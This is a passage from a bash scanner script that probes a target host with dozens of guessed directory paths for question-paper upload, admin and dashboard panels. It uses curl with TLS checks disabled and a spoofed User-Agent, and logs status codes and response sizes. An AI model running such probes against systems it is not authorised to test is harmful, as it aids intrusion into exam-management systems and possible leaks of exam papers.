         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPFile/"]: "
